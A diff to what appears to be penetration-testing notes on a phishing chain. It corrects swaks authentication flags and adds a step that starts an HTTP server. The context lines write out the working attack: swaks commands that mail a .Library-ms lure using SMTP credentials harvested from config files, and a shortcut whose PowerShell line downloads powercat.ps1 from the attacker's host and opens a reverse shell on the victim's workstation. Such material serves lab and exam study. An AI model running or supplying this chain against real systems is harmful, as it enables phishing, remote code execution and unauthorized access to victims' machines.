@@ -137,7 +137,7 @@ Save as config.Library-ms:
 
 ### Step 3 — Create the malicious shortcut (.lnk)
 
-On Windows (RDP), right-click the desktop > New > Shortcut. Below is the short powercat target (see the full chain section later for why):
+On Kali, start `python3 -m http.server 8000` first. On Windows (RDP), right-click the desktop > New > Shortcut. Below is the short powercat target (see the full chain section later for why):
 
 ```powershell
 powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://$KALI:8000/powercat.ps1'); powercat -c $KALI -p 4445 -e powershell"
@@ -156,13 +156,13 @@ sudo swaks -t TARGET@domain.com --from SENDER@domain.com --server MAIL_IP --body
 #   RCPT TO -> 550 Unknown  = rejected — try adding auth below
 
 # If 550 — add SMTP authentication
-sudo swaks -t TARGET@domain.com --from SENDER@domain.com --server MAIL_IP --body "test" --header "Subject: test" -ap -au SMTP_USER -ap SMTP_PASS
+sudo swaks -t TARGET@domain.com --from SENDER@domain.com --server MAIL_IP --body "test" --header "Subject: test" -a -au SMTP_USER -ap SMTP_PASS
 
 # swaks flags:
 #   -t            = TO (recipient)
 #   --from        = FROM (sender address)
 #   --server      = mail server IP
-#   -ap           = enable SMTP authentication
+#   -a            = enable SMTP authentication
 #   -au           = auth username (SMTP login — NOT necessarily the sender)
 #   -ap           = auth password (found in config files, git repos, databases)
 #   --attach @    = attach a file (@ means read from file path)
@@ -170,7 +170,7 @@ sudo swaks -t TARGET@domain.com --from SENDER@domain.com --server MAIL_IP --body
 #   --suppress-data = cleaner output
 
 # REAL phishing email (after test works)
-sudo swaks -t TARGET@domain.com --from SENDER@domain.com --attach @config.Library-ms --server MAIL_IP --body @body.txt --header "Subject: Staging Script" --suppress-data -ap -au SMTP_USER -ap SMTP_PASS
+sudo swaks -t TARGET@domain.com --from SENDER@domain.com --attach @config.Library-ms --server MAIL_IP --body @body.txt --header "Subject: Staging Script" --suppress-data -a -au SMTP_USER -ap SMTP_PASS
 ```
 
 How to find SMTP creds:
@@ -318,7 +318,7 @@ Email with .Library-ms attachment
   -> Victim double-clicks .lnk
   -> .lnk runs PowerShell: downloads powercat.ps1 from your HTTP server
   -> powercat creates reverse shell back to your Netcat listener
-  -> You have a shell on the victims internal workstation
+  -> You have a shell on the victim's internal workstation
 ```
 
 ### Step 1: WebDAV server on Kali (port 80)
@@ -397,7 +397,7 @@ See the email delivery section above for the full swaks flag reference. One-line
 sudo swaks -t TARGET@domain.com --from SENDER@domain.com --attach @config.Library-ms --server MAIL_IP --body @body.txt --header "Subject: Staging Script" --suppress-data
 
 # With auth (if above returns 550)
-sudo swaks -t TARGET@domain.com --from SENDER@domain.com --attach @config.Library-ms --server MAIL_IP --body @body.txt --header "Subject: Staging Script" --suppress-data -ap -au SMTP_USER -ap SMTP_PASS
+sudo swaks -t TARGET@domain.com --from SENDER@domain.com --attach @config.Library-ms --server MAIL_IP --body @body.txt --header "Subject: Staging Script" --suppress-data -a -au SMTP_USER -ap SMTP_PASS
 ```
 
 body.txt example:
